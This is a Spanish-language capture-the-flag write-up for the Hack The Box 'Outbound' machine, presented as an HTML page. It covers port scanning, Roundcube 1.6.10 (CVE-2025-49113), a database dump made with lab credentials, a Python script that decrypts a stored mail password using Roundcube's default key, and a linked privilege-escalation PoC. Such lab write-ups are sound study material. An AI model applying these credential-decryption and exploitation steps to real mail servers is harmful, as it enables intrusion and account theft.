<!DOCTYPE html><!-- Layout espec√≠fico para writeups en markdown. Muestra hero (si existe) y el contenido --><html lang="es" class="dark"> <head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Writeup</title><script type="module">!function(){const t=localStorage.getItem("theme")||"dark";document.documentElement.classList.toggle("light","light"===t),document.documentElement.classList.toggle("dark","dark"===t)}();</script><link rel="stylesheet" href="/assets/contact.fBeTOWmP.css">
<link rel="stylesheet" href="/assets/contact.sk8r29IW.css"></head> <body class="bg-bg1 text-white"> <div class="min-h-screen flex flex-col"> <!-- Header reutiliza el componente global si est√° disponible --> <header class="w-full py-4"> <div class="container mx-auto flex items-center justify-between"> <a href="/" class="flex items-center gap-3"> <div> <div class="text-lg font-semibold">Angel Corral</div> <div class="text-xs text-slate-400">Informatica y Ciberseguridad</div> </div> </a> <nav class="flex items-center gap-6 text-sm"> <a href="/writeups">Writeups</a> <a href="/projects">Proyectos</a> <a href="/services">Servicios</a> <a href="/contact" class="px-3 py-1 rounded-md border">Contacto</a> <button id="theme-toggle" class="theme-toggle" aria-label="Cambiar tema" type="button"> <svg id="sun-icon" class="hidden" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor"> <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 3v1m0 16v1m9-9h-1M4 12H3m15.364 6.364l-.707-.707M6.343 6.343l-.707-.707m12.728 0l-.707.707M6.343 17.657l-.707.707M16 12a4 4 0 11-8 0 4 4 0 018 0z"></path> </svg> <svg id="moon-icon" class="block" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor"> <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M20.354 15.354A9 9 0 018.646 3.646 9.003 9.003 0 0012 21a9.003 9.003 0 008.354-5.646z"></path> </svg> </button> <script type="module">!function(){const e=document.getElementById("theme-toggle"),t=document.getElementById("sun-icon"),s=document.getElementById("moon-icon"),d=document.documentElement;function c(){return localStorage.getItem("theme")||"dark"}function l(e){"light"===e?(d.classList.remove("dark"),d.classList.add("light"),t.classList.remove("hidden"),t.classList.add("block"),s.classList.remove("block"),s.classList.add("hidden")):(d.classList.remove("light"),d.classList.add("dark"),s.classList.remove("hidden"),s.classList.add("block"),t.classList.remove("block"),t.classList.add("hidden")),localStorage.setItem("theme",e)}l(c()),e.addEventListener("click",()=>{l("light"===c()?"dark":"light")})}();</script> </nav> </div> </header> <main class="container mx-auto px-6 py-10 flex-1"> <article class="max-w-3xl mx-auto">  <div class="prose prose-invert prose-xl max-w-none">   <article class="max-w-5xl mx-auto px-6 py-12"> <!-- ENCABEZADO --> <div class="mb-14 text-center"> <a href="/writeups" class="text-sm text-slate-400 hover:text-accentBlue transition-colors block mb-4">
‚Üê Volver a Writeups
</a> <h1 class="text-5xl font-bold bg-gradient-to-r from-accentBlue to-accentGreen text-transparent bg-clip-text mb-4"> Outbound Hack The Box </h1> <p class="text-slate-400 text-sm mb-2">10 de septiembre de 2025</p> <p class="text-lg text-slate-300 max-w-2xl mx-auto mb-6 leading-relaxed"> Explotacion de vulnerabilidad Roundcube 1.6.10 </p> </div> <!-- BLOQUE DE INFORMACI√ìN T√âCNICA --> <section class="grid md:grid-cols-2 gap-6 mb-12 text-sm"> <div class="bg-slate-900/50 border border-slate-800 p-5 rounded-xl backdrop-blur-sm"> <h2 class="text-accentBlue text-lg font-semibold mb-3">Detalles T√©cnicos</h2> <ul class="space-y-2 text-slate-300">    <li><strong>Dificultad:</strong> Easy</li> </ul> </div> <div class="bg-slate-900/50 border border-slate-800 p-5 rounded-xl backdrop-blur-sm"> <h2 class="text-accentGreen text-lg font-semibold mb-3">Etiquetas y Tecnolog√≠a</h2> <div class="flex flex-wrap gap-2"> <span class="px-3 py-1 rounded-full bg-slate-800/60 text-slate-300 border border-slate-700 text-sm"> nmap </span><span class="px-3 py-1 rounded-full bg-slate-800/60 text-slate-300 border border-slate-700 text-sm"> gobuster </span><span class="px-3 py-1 rounded-full bg-slate-800/60 text-slate-300 border border-slate-700 text-sm"> ssh </span><span class="px-3 py-1 rounded-full bg-slate-800/60 text-slate-300 border border-slate-700 text-sm"> sudo -l </span> </div> </div> </section> <!-- IMAGEN DESTACADA -->  <div class="prose-writeup"> <h2 id=""><img src="/img/Outbound.png" alt="Banner SoulMate"></h2>
<h4 id="credenciales-entregadas-por-htb">Credenciales Entregadas Por HTB</h4>
<p>tyler: LhKL1o9Nm3X2</p>
<hr>
<h3 id="-escaneo-y-enumeraci√≥n">üîé Escaneo y Enumeraci√≥n</h3>
<hr>
<h4 id="-escaneos">üìå Escaneos</h4>
<ul>
<li>Comando usado:</li>
</ul>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">nmap</span><span style="color:#BD93F9"> -sSCV</span><span style="color:#BD93F9"> -p-</span><span style="color:#BD93F9"> --open</span><span style="color:#BD93F9"> -T4</span><span style="color:#BD93F9"> -Pn</span><span style="color:#BD93F9"> -n</span><span style="color:#BD93F9"> -vvv</span><span style="color:#BD93F9"> -oN</span><span style="color:#F1FA8C"> escaneo_nmap.txt</span><span style="color:#BD93F9"> -oX</span><span style="color:#F1FA8C"> escaneo_nmap.xml</span><span style="color:#FF79C6"> &#x3C;</span><span style="color:#F1FA8C">I</span><span style="color:#F8F8F2">P</span><span style="color:#FF79C6">></span></span></code></pre>
<h4 id="-puertos-y-servicios-descubiertos">üì¶ Puertos y Servicios Descubiertos</h4>
<ul>
<li>Captura:</li>
</ul>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"></span>
<span class="line"><span style="color:#50FA7B"> PORT</span><span style="color:#F1FA8C">   STATE</span><span style="color:#F1FA8C"> SERVICE</span><span style="color:#F1FA8C"> REASON</span><span style="color:#F1FA8C">         VERSION</span></span>
<span class="line"><span style="color:#F8F8F2"> </span></span>
<span class="line"><span style="color:#50FA7B">  22/tcp</span><span style="color:#F1FA8C"> open</span><span style="color:#F1FA8C">  ssh</span><span style="color:#F1FA8C">     syn-ack</span><span style="color:#F1FA8C"> ttl</span><span style="color:#BD93F9"> 63</span><span style="color:#F1FA8C"> OpenSSH</span><span style="color:#F1FA8C"> 9.6p1</span><span style="color:#F1FA8C"> Ubuntu</span><span style="color:#F1FA8C"> 3ubuntu13.12</span><span style="color:#F8F8F2"> (Ubuntu </span><span style="color:#F1FA8C">Linux</span><span style="color:#F8F8F2">; </span><span style="color:#50FA7B">protocol</span><span style="color:#BD93F9"> 2.0</span><span style="color:#F8F8F2">)</span></span>
<span class="line"><span style="color:#F8F8F2"> </span></span>
<span class="line"><span style="color:#50FA7B">  80/tcp</span><span style="color:#F1FA8C"> open</span><span style="color:#F1FA8C">  http</span><span style="color:#F1FA8C">    syn-ack</span><span style="color:#F1FA8C"> ttl</span><span style="color:#BD93F9"> 63</span><span style="color:#F1FA8C"> nginx</span><span style="color:#BD93F9"> 1.24.0</span><span style="color:#F8F8F2"> (Ubuntu)</span></span>
<span class="line"></span>
<span class="line"><span style="color:#50FA7B">  http-title:</span><span style="color:#F1FA8C"> Did</span><span style="color:#F1FA8C"> not</span><span style="color:#F1FA8C"> follow</span><span style="color:#F1FA8C"> redirect</span><span style="color:#F1FA8C"> to</span><span style="color:#F1FA8C"> http://mail.outbound.htb/</span></span>
<span class="line"><span style="color:#50FA7B">  Service</span><span style="color:#F1FA8C"> Info:</span><span style="color:#F1FA8C"> OS:</span><span style="color:#F1FA8C"> Linux</span><span style="color:#F8F8F2">; </span><span style="color:#50FA7B">CPE:</span><span style="color:#F1FA8C"> cpe:/o:linux:linux_kernel</span></span>
<span class="line"></span></code></pre>
<hr>
<ul>
<li>WhatWeb: HTTPServer Ubuntu Linux nginx/1.24.0 (Ubuntu), Redirect Location mail.outbound.htb , nginx 1.24.0</li>
</ul>
<hr>
<h4 id="-enumeraci√≥n-web">üåê Enumeraci√≥n Web</h4>
<ul>
<li>Comandos Utilisados:</li>
</ul>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">gobuster</span><span style="color:#F1FA8C"> dir</span><span style="color:#BD93F9"> -u</span><span style="color:#F1FA8C"> http://</span><span style="color:#FF79C6">&#x3C;</span><span style="color:#F1FA8C">I</span><span style="color:#F8F8F2">P</span><span style="color:#FF79C6">></span><span style="color:#BD93F9"> -w</span><span style="color:#F1FA8C"> /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt</span><span style="color:#BD93F9"> -t</span><span style="color:#BD93F9"> 50</span><span style="color:#BD93F9"> -b</span><span style="color:#FF79C6"> &#x3C;</span><span style="color:#F1FA8C">NO-STATU</span><span style="color:#F8F8F2">S</span><span style="color:#FF79C6">></span></span></code></pre>
<hr>
<ul>
<li>Hallazgos</li>
</ul>
<p>mail.outbound.htb <br>
outbound.htb</p>
<hr>
<h4 id="-vulnerabilidades">üîç Vulnerabilidades</h4>
<ul>
<li>
<p>CVE: <code>CVE-2025-49113</code></p>
</li>
<li>
<p>Versiones Encontradas: <code>Roundcube 1.6.10</code></p>
</li>
</ul>
<hr>
<h2 id="-explotaci√≥n">üí• Explotaci√≥n</h2>
<p>Comandos:</p>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">mysql</span><span style="color:#BD93F9"> -u</span><span style="color:#F1FA8C"> roundcube</span><span style="color:#BD93F9"> -pRCDBPass2025</span><span style="color:#BD93F9"> -D</span><span style="color:#F1FA8C"> roundcube</span></span></code></pre>
<p>Resultado:</p>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"></span>
<span class="line"><span style="color:#6272A4"># SELECT * FROM users;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#50FA7B">user_id</span><span style="color:#F1FA8C"> username</span><span style="color:#F1FA8C">         mail_host</span><span style="color:#F8F8F2">  </span></span>
<span class="line"><span style="color:#F8F8F2">                 </span></span>
<span class="line"><span style="color:#50FA7B">3</span><span style="color:#F1FA8C">       tyler</span><span style="color:#F1FA8C">     localhost</span><span style="color:#F1FA8C">       {s:11:</span><span style="color:#E9F284">"</span><span style="color:#F1FA8C">client_hash</span><span style="color:#E9F284">"</span><span style="color:#F8F8F2">;</span><span style="color:#50FA7B">s:16:</span><span style="color:#50FA7B">"2aezFDLvMZhM0VRa"</span><span style="color:#F8F8F2">;</span><span style="color:#50FA7B">i:0</span><span style="color:#F8F8F2">;</span><span style="color:#50FA7B">b:0</span><span style="color:#F8F8F2">;}</span></span>
<span class="line"><span style="color:#50FA7B">1</span><span style="color:#F1FA8C">       jacob</span><span style="color:#F1FA8C">     localhost</span><span style="color:#F1FA8C">       {s:11:</span><span style="color:#E9F284">"</span><span style="color:#F1FA8C">client_hash</span><span style="color:#E9F284">"</span><span style="color:#F8F8F2">;</span><span style="color:#50FA7B">s:16:</span><span style="color:#50FA7B">"hpLLqLwmqbyihpi7"</span><span style="color:#F8F8F2">;}</span></span>
<span class="line"><span style="color:#50FA7B">2</span><span style="color:#F1FA8C">       mel</span><span style="color:#F1FA8C">       localhost</span><span style="color:#F1FA8C">       {s:11:</span><span style="color:#E9F284">"</span><span style="color:#F1FA8C">client_hash</span><span style="color:#E9F284">"</span><span style="color:#F8F8F2">;</span><span style="color:#50FA7B">s:16:</span><span style="color:#50FA7B">"GCrPGMkZvbsnc3xv"</span><span style="color:#F8F8F2">;}</span></span>
<span class="line"></span>
<span class="line"><span style="color:#6272A4"># SHOW TABLES;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#50FA7B">cache</span></span>
<span class="line"><span style="color:#50FA7B">cache_index</span></span>
<span class="line"><span style="color:#50FA7B">cache_messages</span></span>
<span class="line"><span style="color:#50FA7B">cache_shared</span></span>
<span class="line"><span style="color:#50FA7B">cache_thread</span></span>
<span class="line"><span style="color:#50FA7B">collected_addresses</span></span>
<span class="line"><span style="color:#50FA7B">contactgroupmembers</span></span>
<span class="line"><span style="color:#50FA7B">contactgroups</span></span>
<span class="line"><span style="color:#50FA7B">contacts</span></span>
<span class="line"><span style="color:#50FA7B">dictionary</span></span>
<span class="line"><span style="color:#50FA7B">filestore</span></span>
<span class="line"><span style="color:#50FA7B">identities</span></span>
<span class="line"><span style="color:#50FA7B">responses</span></span>
<span class="line"><span style="color:#50FA7B">searches</span></span>
<span class="line"><span style="color:#50FA7B">session</span></span>
<span class="line"><span style="color:#50FA7B">system</span></span>
<span class="line"><span style="color:#50FA7B">users</span></span>
<span class="line"></span></code></pre>
<p>Decodificador:</p>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"></span>
<span class="line"><span style="color:#50FA7B">import</span><span style="color:#F1FA8C"> base64</span></span>
<span class="line"><span style="color:#50FA7B">from</span><span style="color:#F1FA8C"> Crypto.Cipher</span><span style="color:#F1FA8C"> import</span><span style="color:#F1FA8C"> DES3</span></span>
<span class="line"></span>
<span class="line"><span style="color:#50FA7B">key</span><span style="color:#F1FA8C"> =</span><span style="color:#F1FA8C"> b</span><span style="color:#E9F284">'</span><span style="color:#F1FA8C">rcmail-!24ByteDESkey*Str</span><span style="color:#E9F284">'</span></span>
<span class="line"><span style="color:#50FA7B">def</span><span style="color:#F1FA8C"> rcube_decrypt</span><span style="color:#F8F8F2">(</span><span style="color:#50FA7B">cipher_b64,</span><span style="color:#F1FA8C"> key</span><span style="color:#F8F8F2">)</span><span style="color:#F1FA8C">:</span></span>
<span class="line"><span style="color:#50FA7B">    cipher_raw</span><span style="color:#F1FA8C"> =</span><span style="color:#F1FA8C"> base64.b64decode</span><span style="color:#F8F8F2">(</span><span style="color:#50FA7B">cipher_b64</span><span style="color:#F8F8F2">)</span></span>
<span class="line"><span style="color:#50FA7B">    iv</span><span style="color:#F1FA8C"> =</span><span style="color:#F1FA8C"> cipher_raw[:8]</span></span>
<span class="line"><span style="color:#50FA7B">    ciphertext</span><span style="color:#F1FA8C"> =</span><span style="color:#F1FA8C"> cipher_raw[8:]</span></span>
<span class="line"><span style="color:#50FA7B">    cipher</span><span style="color:#F1FA8C"> =</span><span style="color:#F1FA8C"> DES3.new</span><span style="color:#F8F8F2">(</span><span style="color:#50FA7B">key,</span><span style="color:#F1FA8C"> DES3.MODE_CBC,</span><span style="color:#F1FA8C"> iv</span><span style="color:#F8F8F2">)</span></span>
<span class="line"><span style="color:#50FA7B">    plaintext</span><span style="color:#F1FA8C"> =</span><span style="color:#F1FA8C"> cipher.decrypt</span><span style="color:#F8F8F2">(</span><span style="color:#50FA7B">ciphertext</span><span style="color:#F8F8F2">)</span></span>
<span class="line"><span style="color:#50FA7B">    pad_len</span><span style="color:#F1FA8C"> =</span><span style="color:#F1FA8C"> plaintext[-1]</span></span>
<span class="line"><span style="color:#FF79C6">    return</span><span style="color:#F1FA8C"> plaintext[:-pad_len].decode</span><span style="color:#F8F8F2">(</span><span style="color:#BD93F9">errors</span><span style="color:#FF79C6">=</span><span style="color:#E9F284">"</span><span style="color:#F1FA8C">ignore</span><span style="color:#E9F284">"</span><span style="color:#F8F8F2">)</span></span>
<span class="line"></span>
<span class="line"><span style="color:#50FA7B">cipher_b64</span><span style="color:#F1FA8C"> =</span><span style="color:#E9F284"> "</span><span style="color:#F1FA8C">bL9uVf9w35H/YQC75uyDjo1d/RR/zsUU</span><span style="color:#E9F284">"</span></span>
<span class="line"><span style="color:#8BE9FD">print</span><span style="color:#F8F8F2">(</span><span style="color:#F1FA8C">rcube_decrypt</span><span style="color:#F8F8F2">(</span><span style="color:#F1FA8C">cipher_b64,</span><span style="color:#F1FA8C"> key</span><span style="color:#F8F8F2">))</span></span></code></pre>
<hr>
<h4 id="-credenciales-encontradas">üîó Credenciales encontradas</h4>
<ul>
<li>
<p>Usuario: <code>jacob</code></p>
</li>
<li>
<p>Contrase√±a: <code>595mO8DmwGeD</code></p>
</li>
<li>
<p>Origen (FTP/SSH/Web): <code>MAIL PORTAL</code></p>
</li>
</ul>
<p>POC: <a href="https://github.com/BridgerAlderson/CVE-2025-27591-PoC/blob/main/exploit.py">https://github.com/BridgerAlderson/CVE-2025-27591-PoC/blob/main/exploit.py</a></p>
<hr>
<h4 id="-resumen">üìÇ Resumen</h4>
<ul>
<li>
<p>M√©todo: <code>Pivoting, Reastic abuse privilege</code></p>
</li>
<li>
<p>Nivel de Acceso: <code>root</code></p>
</li>
</ul> </div> <!-- FOOTER DEL ART√çCULO --> <div class="mt-16 pt-8 border-t border-slate-800 text-center"> <a href="/writeups" class="text-slate-400 hover:text-accentBlue transition-colors">
‚Üê Volver a la lista de writeups
</a> </div> </article>   </div> </article> </main> <footer class="w-full py-6 mt-12"> <div class="container mx-auto text-sm text-slate-400">
¬© 2025 Angel Corral - Todos los derechos reservados.
</div> </footer> </div> </body></html>